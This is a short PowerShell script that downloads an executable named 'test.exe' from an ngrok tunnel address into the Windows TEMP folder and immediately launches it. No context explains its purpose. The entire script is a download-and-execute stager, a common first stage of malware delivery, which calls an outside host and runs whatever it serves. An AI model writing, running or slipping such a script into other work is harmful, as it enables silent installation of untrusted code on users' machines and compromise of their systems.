$binaryUrl = "https://7dad959f.ngrok.io/test.exe"
$binaryPath = "$env:TEMP\test.exe"

Function Get-Binary
{
	Invoke-WebRequest "$binaryUrl" -o "$binaryPath"
}

Function Invoke-Binary
{
	Start-Process "$binaryPath"
}

Get-Binary
Invoke-Binary
